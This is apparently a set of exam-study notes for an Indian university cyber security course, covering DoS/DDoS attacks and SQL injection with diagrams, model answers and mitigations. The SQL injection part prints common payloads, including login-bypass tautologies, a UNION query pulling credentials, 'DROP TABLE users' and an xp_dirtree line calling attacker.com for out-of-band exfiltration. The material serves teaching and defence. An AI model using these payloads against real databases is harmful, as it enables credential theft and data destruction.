**Inference:** Cybercrime has an extraordinarily low barrier to entry and high ROI — a key reason DoS/DDoS remains the **#1 attack vector** reported in industry threat intelligence (per Cloudflare, Akamai Q4 reports).
</br>
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 Diagram 1 — Single-Source DoS Attack Flow

```mermaid
flowchart LR
    A[Attacker Host] -->|1. Flood SYN packets| B[Target Web Server]
    B -->|2. SYN-ACK to spoofed IPs| C[Non-existent Hosts]
    C -.->|No ACK ever| B
    B -->|3. Backlog fills| D[Legitimate User]
    D -->|4. Connection refused| B
    B --> E[Service Unavailable]
```

**Interpretation:** Spoofed source IPs cause the server's SYN-ACK to vanish into the void. The half-open socket lingers until timeout, eventually starving legitimate clients.

## 4.2 Diagram 2 — Distributed DoS via Botnet (DDoS Architecture)

```mermaid
flowchart TB
    subgraph control [Command and Control Layer]
        H[Bot Herder Master]
    end

    subgraph botnet [Botnet - Thousands of Compromised Hosts]
        Z1[Zombie Bot 1]
        Z2[Zombie Bot 2]
        Z3[Zombie Bot N]
    end

    subgraph victim [Victim Infrastructure]
        FW[Firewall]
        SRV[Target Server]
        APP[Application Layer]
    end

    H -->|1. Attack command via IRC P2P HTTP| Z1
    H -->|1. Attack command| Z2
    H -->|1. Attack command| Z3
    Z1 -->|2. Flood traffic| FW
    Z2 -->|2. Flood traffic| FW
    Z3 -->|2. Flood traffic| FW
    FW -->|3. Overwhelmed| SRV
    SRV -->|4. Crash or hang| APP
```

**Interpretation:** A single "Bot Herder" orchestrates thousands of geographically distributed compromised machines (Zombies/Bots) that simultaneously bombard the victim. Mitigation is hard because traffic originates from many legitimate-looking IPs.

## 4.3 Diagram 3 — SYN Flood Three-Way Handshake Exploitation

```mermaid
sequenceDiagram
    participant C as Attacker (Spoofed IP)
    participant S as Target Server
    participant L as Legitimate User

    C->>S: SYN (seq = x)
    S-->>C: SYN-ACK (seq = y, ack x+1)
    Note over S: Half-open socket allocated
    C-->>S: (No ACK ever sent)
    Note over C: Spoofed IP, no reply possible

    L->>S: SYN (seq = a)
    S-->>L: Connection refused or dropped
    Note over S: Backlog full, no slots left
```

**Interpretation:** Each spoofed SYN permanently "reserves" a slot in the server's TCB table. When the table fills, the server can no longer accept ANY new connections — even from genuine users.

## 4.4 Diagram 4 — Layered Defense-in-Depth Architecture

```mermaid
flowchart TB
    L1[Layer 1 - ISP Scrubbing Center] -->|Clean traffic| L2
    L2[Layer 2 - Anycast CDN Edge] -->|Rate-limited traffic| L3
    L3[Layer 3 - Perimeter Firewall] -->|Filtered packets| L4
    L4[Layer 4 - WAF and IPS] -->|Inspected HTTP| L5
    L5[Layer 5 - Origin Web Server] -->|Application logic| L6
    L6[Layer 6 - Database with Connection Pool Cap]

    A[Volumetric DDoS 1 Tbps] -->|Hits| L1
    A2[Application Layer Bot] -->|Hits| L4
    A3[Protocol Exploit] -->|Hits| L3
```

**Interpretation:** Modern DoS defense employs **defense-in-depth** — no single layer can stop a sophisticated attack. Each layer strips a different attack class: Layer 1 absorbs volumetric floods, Layer 4 detects application-layer anomalies, Layer 6 prevents DB connection exhaustion.
</br>
<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A Questions (3 Marks Each)

### Question 1 `[KTU University Exam - May 2024]`

**Q: Define Denial-of-Service (DoS) attack. Differentiate between DoS and DDoS.**

**Model Answer (3 marks):**

A **Denial-of-Service (DoS)** attack is a malicious attempt to disrupt the normal functioning of a targeted server, service, or network by overwhelming it with a flood of illegitimate requests or by exploiting vulnerabilities, thereby making the resource unavailable to its intended legitimate users.

**DoS vs. DDoS:**

| Parameter | DoS | DDoS |
|---|---|---|
| Source | Single attacker machine | Multiple distributed machines (botnet) |
| Traffic volume | Limited by one host's bandwidth | Aggregated across thousands of hosts |
| Traceability | Easier — single IP | Very hard — IPs are distributed |
| Mitigation | IP block, rate-limit at firewall | Requires scrubbing centers, anycast |

**(1 mark definition + 2 marks comparison = 3 marks)**

### Question 2 `[KTU University Exam - Dec 2023]`

**Q: What is a SYN Flood attack? Mention any TWO countermeasures.**

**Model Answer (3 marks):**

A **SYN Flood** is a protocol-layer (Layer 4) DoS attack that exploits the TCP three-way handshake. The attacker sends a large number of SYN packets with spoofed source IP addresses. The target allocates buffer space for each half-opened connection and replies with SYN-ACK; however, the spoofed clients never respond with the final ACK. This exhausts the server's connection backlog, preventing legitimate clients from establishing TCP sessions.

**Two countermeasures:**

1. **SYN Cookies**: The server does not allocate a TCB entry on SYN receipt; instead it embeds state information into the sequence number of the SYN-ACK and reconstructs state only when the final ACK arrives. (1½ marks)
2. **Reducing SYN-RECEIVED Timer and Increasing Backlog**: Shorten the timeout to release half-open slots faster and increase the OS-level backlog size. (1½ marks)

---

## 5.2 Part B Questions (14 Marks — Module Internal Choice)

### Question A `[KTU University Exam - July 2024]` — Option 1

**Q: (a) Explain the different categories of DoS attacks with suitable examples for each category. [7 marks]**

**Model Answer:**

DoS attacks are broadly classified into three categories based on the attack vector:

**(i) Volumetric Attacks** (Bandwidth-based) — Saturate the link bandwidth by generating massive traffic volumes. The goal is to consume all available network capacity. Examples: **UDP Flood**, **ICMP Flood**, **DNS Amplification**. Measured in **Gbps**.

**(ii) Protocol / State-Exhaustion Attacks** — Exploit weaknesses in layer 3 and 4 protocols to exhaust server-state resources like connection tables. Examples: **SYN Flood**, **Ping of Death**, **Smurf Attack**. Measured in **packets per second (pps)**.

**(iii) Application Layer Attacks** — Target layer 7 services with legitimate-looking but resource-expensive requests, exhausting threads, sockets, or DB connections. Examples: **HTTP GET/POST Flood**, **Slowloris**, **DNS Query Flood**. Measured in **requests per second (RPS)**.

Additional classifications include **Single-source vs. Distributed (DDoS)** and **Logic vs. Resource-Exhaustion attacks**.

**(1 mark intro + 2 marks each category × 3 = 7 marks)**

---

**(b) Describe the working of a Botnet-based DDoS attack with a neat diagram. List any FOUR mitigation techniques. [7 marks]**

**Model Answer:**

A **botnet** is a network of Internet-connected computers (bots/zombies) infected with malware that allows a remote "Bot Herder" to command them collectively. A botnet-based DDoS attack proceeds in four phases:

**Phase 1 — Recruitment:** The attacker spreads malware (via phishing, drive-by downloads, exploit kits) to compromise thousands of hosts.

**Phase 2 — Command & Control (C2):** The bots register with a C2 server (IRC, HTTP, P2P) and await instructions.

**Phase 3 — Synchronization:** On receiving the attack command, all bots simultaneously begin flooding the victim with chosen protocol packets.

**Phase 4 — Saturation:** The aggregated traffic from N bots overwhelms the victim's link, CPU, or application pool, denying service to legitimate users.

```
[Bot Herder]
     |
   (C2 channel)
     |
+----+----+----+
|    |    |    |
Bot1 Bot2 Bot3 ... BotN
 \   |   /  \
  \  |  /    \
   Flood Traffic
        |
   [Target Server] --> DOWN
```

**Four Mitigation Techniques:**

1. **Anycast Network Scrubbing:** Distribute attack traffic across globally dispersed scrubbing centers (e.g., Cloudflare, Akamai) so no single point saturates.
2. **BGP Blackholing / Sinkholing:** Route known-bad traffic to a null interface (use cautiously — also drops legit traffic).
3. **Rate Limiting & SYN Cookies:** At firewall/server level to prevent resource exhaustion.
4. **Reputation-Based Filtering:** Maintain IP reputation databases and block traffic from low-reputation sources.
5. **Behavioural Anomaly Detection:** Use machine-learning-based NIDS to flag traffic that deviates from baseline.

**(2 marks phases + 2 marks diagram + 3 marks mitigations = 7 marks)**

---

### Question B `[KTU University Exam - July 2024]` — Option 2 (Internal Choice Alternative)

**Q: (a) With a neat diagram, explain the working of the TCP SYN Flood attack. How does a SYN Cookie counter it? [7 marks]**

**Model Answer:**

**TCP SYN Flood Attack — Working:**

The TCP three-way handshake normally requires:

1. Client → Server: **SYN** (initial sequence number $ISN_c$)
2. Server → Client: **SYN-ACK** ($ISN_s$, ack $ISN_c + 1$)
3. Client → Server: **ACK** → Connection ESTABLISHED

In a SYN Flood, the attacker:

- Generates thousands of **SYN packets** with **spoofed source IP addresses**.
- For each SYN, the victim allocates a **TCB entry** (~8 KB kernel memory) and sends a SYN-ACK to the (non-existent) spoofed IP.
- The spoofed host never replies with the final ACK.
- The half-open connection lingers in the **SYN_RECEIVED** state until the retry timeout (typically 75 s).
- With sustained attack, the TCB table fills completely, and the server **drops all new SYNs** — including from legitimate users.

```
Attacker (Spoofed IP)         Server          Real User
        |                       |                |
        |--- SYN (fake IP) ---->|                |
        |                       |                |
        |<-- SYN-ACK ---------- |  (to spoofed,  |
        |                       |   gets lost)   |
        |  (no ACK)             |                |
        |                       |                |
        |                       |<-- SYN --------|
        |                       |--- DROP -------|
        |                       |  (backlog full)|
```

**SYN Cookie Countermeasure:**

In SYN Cookies (proposed by D. J. Bernstein), the server does **NOT allocate a TCB entry** upon receiving the SYN. Instead, it encodes the necessary state into the **initial sequence number $ISN_s$** of the SYN-ACK using a cryptographic hash:

$$ISN_s = H(secret, src\_ip, src\_port, dest\_ip, dest\_port, t)$$

where $H$ is a keyed hash and $t$ is a timestamp. When the final ACK arrives, the server reconstructs the TCB entry on-the-fly by re-computing $H$ and validating it against the ACK's acknowledgment field. **Result:** Zero memory is consumed until the third packet of the handshake completes — effectively neutralizing the attack.

**(2 marks diagram + 3 marks explanation + 2 marks SYN cookie = 7 marks)**

---

**(b) Discuss the Smurf Attack and Ping of Death. What common defense applies to both? [7 marks]**

**Model Answer:**

**Smurf Attack:**

The Smurf attack is an **ICMP Echo Reply (Layer 3) flood** that uses IP spoofing and directed broadcast to amplify traffic. Steps:

1. Attacker sends ICMP Echo Request packets to the **directed broadcast address** of an intermediate network.
2. Source IP of the Echo Request is **spoofed** to be the victim's IP.
3. All live hosts on the intermediate network receive the broadcast and reply to the victim.
4. The victim is overwhelmed by $N_{hosts}$ simultaneous Echo Replies.

**Amplification factor:** $F_{amp} = N_{hosts}$ — a network with 200 hosts multiplies the attack by 200x.

**Ping of Death:**

The Ping of Death is a **logic-exploitation attack** that sends a malformed ICMP Echo Request packet whose total length exceeds the IP maximum of **65,535 bytes**. The packet is fragmented across many IP fragments. When the victim reassembles the fragments, the resulting buffer overflows the kernel's packet reassembly buffer (typically 64 KB on legacy systems), causing a **crash, freeze, or buffer overflow** that can lead to remote code execution.

**Common Defense:**

Both attacks exploit **legacy ICMP/IP protocol behavior** that modern OS hardening and router configuration have eliminated. The common defense includes:

1. **Disable IP Directed Broadcasts** on all edge routers (RFC 2644) — defeats Smurf amplification.
2. **Block/limit inbound ICMP Echo Requests** at the perimeter firewall.
3. **Patch OS kernels** to handle oversized fragments safely (modern kernels discard any fragment that would exceed 65,535 bytes on reassembly).
4. **Enable BCP 38 / uRPF (Unicast Reverse Path Forwarding)** — drops packets with spoofed source IPs at the ISP edge, killing both attacks at the source.

**(2 marks Smurf + 2 marks Ping of Death + 3 marks common defense = 7 marks)**

---

> [!WARNING]
> **KTU Examiner's Valuation Warning — Common Pitfalls:**
> 1. **Confusing DoS with Hacking:** Many students incorrectly write about data theft in DoS answers. Remember — DoS targets **availability**, NOT confidentiality. (Lose 1 mark)
> 2. **Skipping the diagram:** Part B (14-mark) questions **mandate a neat diagram**. Skipping it costs **2 marks minimum**.
> 3. **Forgetting the OSI Layer:** Always state which layer the attack belongs to. Examiners explicitly allocate marks for "Layer 4" or "Application Layer" tags.
> 4. **Writing only definitions in 14-mark questions:** Avoid generic definitions; provide **phases**, **diagrams**, **formulas**, and **mitigations**.
> 5. **Misnaming DDoS agents:** Always use **"Bot Herder"** for the master and **"Zombie/Bot"** for infected hosts — NOT "hacker" or "virus".
> 6. **Omitting numerical justification:** Wherever applicable, quote bandwidth figures (e.g., "GitHub 2018 attack: 1.35 Tbps") to demonstrate real-world awareness.

---

## 5.3 Topic Recap & Important Things to Remember

- **DoS attacks target Availability**, the third pillar of the **CIA Triad**.
- **Three primary categories:** Volumetric (Gbps), Protocol (pps), Application Layer (RPS).
- **DDoS = DoS × N bots** — aggregation of distributed sources via a **botnet**.
- **TCP SYN Flood** exploits the **half-open SYN_RECEIVED** state of the three-way handshake; mitigation = **SYN Cookies**.
- **Ping of Death** exploits oversized fragmented ICMP packets; mitigation = modern OS kernel + **RFC-recommended fragment handling**.
- **Smurf Attack** uses **IP-directed broadcast** with **spoofed source IP**; mitigation = **disable directed broadcast + uRPF**.
- **Slowloris** opens many partial HTTP connections to exhaust Apache/Nginx thread pools; mitigation = **reverse proxy + tightened timeouts**.
- **DNS Amplification** achieves ~50x amplification factor — turning small requests into large UDP responses.
- **Availability formula** $A = MTBF / (MTBF + MTTR)$ — DoS attacks artificially increase **MTTR**, plunging availability.
- **Defense-in-depth** is mandatory: ISP scrubbing → Anycast CDN → Firewall → WAF → Origin server → DB connection caps.
- **Real-world reference:** GitHub DDoS (Feb 2018) peaked at **1.35 Tbps** — the largest recorded attack at that time.
- **Legal note:** DoS attacks are punishable under **IT Act 2000, Section 66 (F)** of India and equivalent statutes worldwide (e.g., **CFAA** in the USA).
- **Always** identify the **OSI Layer** of the attack in your answer.
- **Always** include a **neat labeled diagram** in any 7-mark or 14-mark question.
- **Always** list **at least 2 mitigation techniques** for every attack discussed.

<!-- SECTION_5_END -->

topics.title: SQL Injections
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEEOT741 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 3
> - **Topic:** SQL Injections

<!-- SECTION_1_START -->
# 1. Core Technical Definition & Intuitive Overview

## Formal Academic Definition

**SQL Injection (SQLi)** is a server-side code injection attack technique in which an adversary inserts (or "injects") malicious Structured Query Language (SQL) statements into the input fields, parameters, or HTTP request payloads of a web application. When the application naively concatenates or interpolates this untrusted input into the backend SQL query without proper sanitization, the database engine executes the attacker's code as part of the legitimate query. This breaks the original **Confidentiality, Integrity, and Availability (CIA) triad** of the data layer.

> [!IMPORTANT]
> **KTU Syllabus Highlight:** Under the OWASP Top 10 (2021), **Injection Attacks (A03:2021)** — of which SQLi is the most prevalent variant — is the **3rd most critical** web application security risk. KTU expects you to be able to identify, classify, and propose mitigation strategies for SQLi.

## Conceptual Analogy / Intuition

Imagine a bank where the **teller** (the web server) is trained to execute *any* instruction written on a withdrawal slip (the HTTP request) as long as it is signed by a customer. The bank has a **vault** (the database) full of money. 

Now consider two slips:
1. **Normal slip:** *"Withdraw ₹5,000 from Account 1024."*
2. **Malicious slip (SQLi):** *"Withdraw ₹5,000 from Account 1024. Also, please open the vault and hand me everything inside. — Thank you, Account 1024."*

Because the teller is a "good employee," he executes *both* parts of the slip. The attacker didn't hack the vault door (database) or the lock mechanism (authentication). He simply **tricked the teller into following hidden, malicious instructions** mixed in with a legitimate request. This is precisely how SQL Injection works — it abuses the **trust** the application places in user input.

## Key Terminology (KTU Board Standard)

| Term | Definition |
|---|---|
| **Injection Vector** | The entry point where malicious SQL is supplied (login form, URL parameter, cookie, HTTP header). |
| **Payload** | The malicious SQL fragment crafted by the attacker. |
| **Dynamic SQL** | A query built by concatenating user input as strings (the vulnerable pattern). |
| **Tautology** | A SQL clause that always evaluates to `TRUE` (e.g., `1=1`), used to bypass authentication. |
| **Database Engine** | The software (MySQL, PostgreSQL, Oracle, MSSQL) that parses and executes SQL. |
| **UNION Operator** | A SQL keyword used to combine results of two `SELECT` queries — heavily abused in SQLi. |

> [!NOTE]
> **Standard Metric:** The industry-standard benchmark for web app injection flaws is the **OWASP Top 10 (2021)** and the **CWE-89** (Common Weakness Enumeration) classification, which categorizes SQLi as *"Improper Neutralization of Special Elements used in an SQL Command."*

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 2. Deep Theoretical Analysis & KTU High-Yield Cheat Sheet

## 2.1 Operational Mechanism — Step-by-Step

An SQLi attack progresses through a deterministic, six-stage pipeline:

1. **Reconnaissance (Information Gathering):** The attacker probes the application for entry points — login pages, search boxes, URL query parameters (`?id=5`), cookies, and HTTP headers.
2. **Fingerprinting the DBMS:** The attacker injects database-specific syntax (e.g., `' AND SLEEP(5)--` for MySQL, `' AND DB_NAME()='master` for MSSQL) to identify the backend engine.
3. **Injecting the Payload:** Malicious SQL is appended to a legitimate input. The single quote (`'`) is the classic "canary" used to break out of a string context and trigger a database error.
4. **Query Manipulation:** The application's backend dynamically builds a string by concatenating the input, resulting in a syntactically valid but semantically malicious query.
5. **Exploitation:** Depending on the attacker's goal, the modified query may:
   - Authenticate the attacker without valid credentials (Authentication Bypass).
   - Extract sensitive data rows (Data Exfiltration).
   - Modify or destroy records (Data Tampering).
   - Execute OS commands on the database server (RCE via `xp_cmdshell`).
6. **Exfiltration & Persistence:** Stolen data is transmitted back via HTTP responses, DNS lookups, or out-of-band channels.

## 2.2 Taxonomy of SQL Injection Attacks

The three canonical families (per KTU Module 3 and OWASP testing guide):

| Type | Mechanism | Detection Difficulty |
|---|---|---|
| **In-band SQLi** (Classic) | Results are returned in the *same* channel as the attack (e.g., error message or page content). Subtypes: *Error-based* and *UNION-based*. | Low — data is visible directly. |
| **Inferential SQLi** (Blind) | Server gives *no* visible data. Attacker infers information by observing behavioral differences (timing or boolean responses). | Medium to High. |
| **Out-of-band SQLi** | Data is exfiltrated via a different channel (DNS, HTTP request to attacker server) using DBMS features like `xp_dirtree` or `UTL_HTTP`. | High. |

## 2.3 The "Formula Sheet" — Common Injection Patterns

While SQLi is not a math-heavy topic, KTU examiners expect you to **memorize the canonical patterns** used to construct and identify an attack. These are your "formulas":

| Pattern | Purpose | Example |
|---|---|---|
| ` ' OR '1'='1` | Tautology — always true, bypasses login. | `' OR '1'='1' -- ` |
| `'; --` | Comment terminator — discards rest of query. | `admin'; --` |
| `' UNION SELECT ... --` | Stacks a second query to fetch extra data. | `' UNION SELECT username, password FROM users-- ` |
| `' AND 1=1 --` | True condition test (proves injection works). | — |
| `' AND 1=2 --` | False condition test (compares responses). | — |
| `'; DROP TABLE users; --` | Stacked queries — destroys a table. | (MySQL/MSSQL with stacked query support) |
| `' OR SLEEP(5) --` | Time-based blind injection payload. | — |

> [!IMPORTANT]
> **Why these work:** A vulnerable backend builds the query as a *string concatenation*. If the original query expects `WHERE username='<INPUT>'`, the literal apostrophe from the attacker **closes the string prematurely**, allowing the rest of the attacker's text to be parsed as SQL keywords.

## 2.4 The SQLi Attack "Equation"

Conceptually, an SQLi vulnerability can be expressed as a logical identity:

$$
\text{Vulnerable Query} = \text{Static SQL Template} \;\Vert\; \text{Untrusted User Input}
$$

Where $\Vert$ denotes **string concatenation**. The vulnerability exists **if and only if** the untrusted input is passed to the database engine without *neutralization* (escaping, parameterization, or whitelisting). The fix is to replace $\Vert$ with a **bound parameter interface**:

$$
\text{Safe Query} = \text{Prepared Statement}(\text{Static SQL}, \text{Bound Parameters})
$$

## 2.5 Real-World Engineering Utility

- **Financial Sector:** Prevents unauthorized fund transfers and data breaches.
- **Healthcare (HIPAA Compliance):** Protects Electronic Health Records (EHRs).
- **E-Governance (KTU Context):** Defends citizen-data portals from mass exfiltration.
- **DevSecOps Pipelines:** Static Application Security Testing (SAST) tools like **SonarQube** and dynamic scanners like **SQLMap** are integrated into CI/CD to catch SQLi *before* deployment.

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Worked Example 1 — Authentication Bypass (Tautology Attack)

**Vulnerable Code (Pseudo-backend logic):**

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

The web application takes the `username` and `password` from a login form and drops them directly into the SQL string.

### Step-by-Step Attack Construction

**Input Supplied by the Attacker in the username field:**

```
' OR '1'='1' -- 
```

**Step 1 — The legitimate query template:**

$$
\text{Query} = \text{"SELECT * FROM users WHERE username = '"} \;\Vert\; \text{user} \;\Vert\; \text{"' AND password = '"} \;\Vert\; \text{pass} \;\Vert\; \text{"'"}
$$

**Step 2 — Substitute the malicious input (assuming `user = ' OR '1'='1' -- ` and `pass = anything`):**

$$
\begin{aligned}
\text{Query} &= \text{"SELECT * FROM users WHERE username = '"} \;\Vert\; \text{"' OR '1'='1' -- "} \;\Vert\; \text{"' AND password = '"} \;\Vert\; \text{"x"} \;\Vert\; \text{"'"} \\
&= \text{"SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'x'"}
\end{aligned}
$$

**Step 3 — Database parses the resulting query:**

$$
\begin{aligned}
&\text{SELECT * FROM users} \\
&\text{WHERE username = ''} \\
&\text{OR '1'='1'} \\
&\text{-- ' AND password = 'x'}
\end{aligned}
$$

**Step 4 — Logical evaluation:**

- The first clause `username = ''` is `FALSE` (no user has an empty string username).
- The second clause `'1'='1'` is **always TRUE**.
- The `--` comment discards the password check entirely.
- The full `WHERE` clause evaluates to `TRUE`.
- The query returns **all rows in the `users` table**.
- The application grants the attacker a session, often as the **first user in the table** (typically the administrator).

> [!IMPORTANT]
> **Result:** Complete authentication bypass. The attacker is now logged in without supplying valid credentials.

---

## 3.2 Worked Example 2 — UNION-Based Data Exfiltration

**Vulnerable Query Template (e.g., a product details page):**

```sql
SELECT name, price FROM products WHERE id = $id
```

The `$id` is taken from a URL parameter such as `?id=10`.

### Attack Walkthrough

**Attacker supplies the URL:**

```
https://victim.com/product?id=10' UNION SELECT username, password FROM users-- 
```

**Step 1 — Concatenation yields:**

$$
\begin{aligned}
\text{Query} &= \text{"SELECT name, price FROM products WHERE id = 10"} \\
&\;\;\Vert\; \text{"' UNION SELECT username, password FROM users-- "} \\
&= \text{"SELECT name, price FROM products WHERE id = 10' UNION SELECT username, password FROM users-- "}
\end{aligned}
$$

**Step 2 — Database parses the query:**

$$
\begin{aligned}
&\text{SELECT name, price FROM products WHERE id = 10} \\
&\text{UNION} \\
&\text{SELECT username, password FROM users}
\end{aligned}
$$

**Step 3 — Result:**

The page displays the product name and price (column 1 and 2) — but **column 1 and column 2 are now filled with usernames and passwords from the `users` table**. The attacker harvests credentials directly from the rendered HTML.

> [!NOTE]
> **Column count matching is mandatory:** A UNION query requires the second `SELECT` to return the **same number of columns** as the first. Attackers determine this using `ORDER BY n` clauses (`?id=10 ORDER BY 5-- `) to find the error threshold.

---

## 3.3 Analytical Matrix — Injection vs. Mitigation

| Attack Vector | Sample Payload | Mitigation Strategy |
|---|---|---|
| Login Form Tautology | `' OR '1'='1' -- ` | **Prepared Statements** (parameterized queries) |
| URL Parameter UNION | `?id=10' UNION SELECT ...` | **Input Validation** + **Whitelisting** numeric types |
| Cookie Manipulation | `Cookie: user=' OR 1=1--` | **Stored Procedures** with bound args |
| HTTP Header Injection | `User-Agent: ' OR SLEEP(5)--` | **Web Application Firewall (WAF)** rules |
| Blind Boolean | `?id=10' AND 1=1--` vs. `?id=10' AND 1=2--` | **ORM Frameworks** (Hibernate, Sequelize) |
| Time-Based Blind | `?id=10'; IF(1=1, SLEEP(5), 0)--` | **Least Privilege** DB accounts + **Query Timeouts** |
| Out-of-Band (DNS) | `'; EXEC xp_dirtree '\\\\attacker.com\\x'--` | **Network Egress Filtering** + disable dangerous procs |

---

## 3.4 The Definitive Mitigation — Prepared Statements (Derivation of Safety)

The fundamental fix is to ensure user input is **never** interpreted as SQL syntax. Mathematically:

$$
\text{Original Risk: } \text{DBMS.parse}(\text{StaticSQL} \Vert \text{UserInput}) \to \text{Ambiguous}
$$

$$
\text{Fixed Pattern: } \text{DBMS.parse}(\text{StaticSQL}) \to \text{Plan}, \;\;\text{DBMS.bind}(\text{Plan}, \text{UserInput}) \to \text{SafeResult}
$$

In a **prepared statement**, the SQL template is sent to the database, **compiled into an execution plan**, and *then* the user input is supplied as a *bound parameter* — a value the engine **explicitly knows is data, not code**.

**Vulnerable (PHP example for reference, not for execution):**

```sql
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

**Safe (Parameterized):**

```sql
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

> [!WARNING]
> **KTU Pitfall:** Prepared statements handle **values**, not **column names** or `ORDER BY` clauses. For those, you must use **strict whitelisting** (e.g., a fixed set of allowed sort columns stored in an array).

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 End-to-End SQL Injection Attack Flow (Mermaid)

```mermaid
flowchart TD
    A[Attacker Browses Victim Web App] --> B[Identifies Input Fields and URL Parameters]
    B --> C{Injects Test Payloads e.g. single quote}
    C -->|SQL Error Returned| D[Confirms Injection Point]
    C -->|No Error| E[Tests Boolean and Time-Based Probes]
    D --> F[Fingerprints DBMS MySQL MSSQL Oracle]
    E --> F
    F --> G[Classifies Attack Type In-band Blind Out-of-band]
    G --> H[In-band: UNION-based Exfiltration]
    G --> I[Inferential: Boolean and Time-based Inference]
    G --> J[Out-of-band: DNS or HTTP Exfiltration]
    H --> K[Extracts Tables Columns and Credentials]
    I --> K
    J --> K
    K --> L[Escalates Privileges or Modifies Data]
    L --> M[Persistence: Backdoor Accounts and Web Shells]
    M --> N[Cover Tracks and Exfiltrate Datasets]
```

## 4.2 Secure vs. Vulnerable Request Lifecycle (Mermaid)

```mermaid
flowchart LR
    subgraph VULN[Vulnerable Architecture]
        V1[User Input Form] --> V2[String Concatenation in Code]
        V2 --> V3[SQL String with Embedded User Data]
        V3 --> V4[DBMS parses string and treats user data as code]
        V4 --> V5[Database Compromise]
    end

    subgraph SAFE[Secure Architecture]
        S1[User Input Form] --> S2[Input Validation and Whitelisting]
        S2 --> S3[Prepared Statement with Bound Parameters]
        S3 --> S4[DBMS compiles static SQL first]
        S4 --> S5[User input bound as data only]
        S5 --> S6[Safe Query Result Returned]
    end
```

## 4.3 SQLi Type Classification Block Diagram (Mermaid)

```mermaid
flowchart TD
    A[SQL Injection Attacks] --> B[In-band SQLi]
    A --> C[Inferential Blind SQLi]
    A --> D[Out-of-band SQLi]

    B --> B1[Error-based SQLi]
    B --> B2[UNION-based SQLi]

    C --> C1[Boolean-based Blind SQLi]
    C --> C2[Time-based Blind SQLi]

    D --> D1[DNS-based Exfiltration]
    D --> D2[HTTP-based Exfiltration]
```

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

---

## Part A — Short Answer Questions (3 Marks Each)

### Q1. `[KTU University Exam — May 2024 Model]`
**Define SQL Injection. List any two types of SQL injection attacks.**

**Model Answer (3 Marks):**

SQL Injection (SQLi) is a code injection technique in which an attacker supplies malicious SQL statements as input to a web application, which are then executed by the backend database engine, leading to unauthorized data access or manipulation. **(1.5 marks)**

**Two types:** **(1.5 marks)**
1. **In-band SQLi:** The attacker uses the same communication channel to launch the attack and gather results (e.g., error-based or UNION-based).
2. **Inferential (Blind) SQLi:** No data is transferred via the web application; the attacker infers information by observing the server's behavioral response (boolean or time-based).

---

### Q2. `[KTU University Exam — Dec 2023 Model]`
**Explain the role of "input validation" in preventing SQL injection.**

**Model Answer (3 Marks):**

Input validation is the process of verifying, filtering, and sanitizing all data supplied by the user *before* it is processed by the application or database. **(1 mark)**

**Role in SQLi prevention:** **(2 marks)**
- It rejects inputs containing dangerous characters such as single quotes, semicolons, and SQL keywords (`UNION`, `SELECT`, `DROP`).
- It enforces **whitelisting** (e.g., an `id` field must be a positive integer) rather than blacklisting.
- It acts as the **first line of defense**, complementing prepared statements and reducing the attack surface for both blind and in-band SQLi attacks.

> [!WARNING]
> **Examiner's Pitfall (Part A):** Students often write *only* the definition and forget to expand on the *role* (the "why"). Marks are split 50/50 between definition and explanation — cover both.

---

## Part B — Long Answer Questions (14 Marks with Internal Choice)

### Question A (14 Marks) `[KTU University Exam — May 2024 Expected Pattern]`

**Q.A.** **(a)** With a suitable example, explain how an attacker performs an **authentication bypass** attack using SQL injection. Demonstrate the query transformation step-by-step. **(7 marks)**

**(b)** Discuss the **five major mitigation strategies** to prevent SQL injection in a web application. For each, state one limitation. **(7 marks)**

---

#### Model Solution for Q.A (a) — Authentication Bypass (7 Marks)

**Step 1 — Identify the vulnerability:** A login form takes `username` and `password` and passes them into a SQL query without sanitization. **(1 mark)**

**Step 2 — Show the vulnerable backend query template:** **(1 mark)**

$$
\text{SELECT * FROM users WHERE username = '}\$\text{user' AND password = '}\$\text{pass'}
$$

**Step 3 — Attacker supplies malicious input in the username field:** **(1 mark)**

```
' OR '1'='1' -- 
```

(Any password is supplied, e.g., `xyz`.)

**Step 4 — Show the resulting concatenated query:** **(1.5 marks)**

$$
\begin{aligned}
&\text{SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'xyz'}
\end{aligned}
$$

**Step 5 — Database parsing and evaluation:** **(1 mark)**
- `username = ''` is FALSE.
- `OR '1'='1'` is TRUE.
- `--` comments out the password clause.
- The query returns **all rows** from the users table. The application logs the attacker in as the first user (often the admin).

**Step 6 — Conclude with impact:** **(1.5 marks)**
The attacker gains **unauthenticated administrative access**, violating **Confidentiality and Integrity**. The application's authentication logic is rendered completely ineffective because trust was placed in unsanitized user input.

---

#### Model Solution for Q.A (b) — Five Mitigation Strategies (7 Marks)

| # | Strategy | Mechanism | Limitation |
|---|---|---|---|
| 1 | **Prepared Statements / Parameterized Queries** | Compiles the SQL template first; user input is bound as data, not code. | Cannot parameterize table/column names or `ORDER BY` clauses. |
| 2 | **Stored Procedures** | Encapsulate SQL logic inside the database; input is passed as parameters. | If implemented using dynamic SQL internally, the vulnerability persists. |
| 3 | **Input Validation & Whitelisting** | Rejects inputs not matching expected patterns (e.g., `id` must be numeric). | Difficult to apply to free-form text fields (comments, descriptions). |
| 4 | **Principle of Least Privilege (DB Accounts)** | The application's DB user has only `SELECT, INSERT, UPDATE` — never `DROP` or `admin`. | Limits application functionality; does not prevent data exfiltration. |
| 5 | **Web Application Firewall (WAF) / Escaping** | Blocks known SQLi patterns; escapes special characters. | Bypassed by advanced encoding (e.g., double URL encoding). |

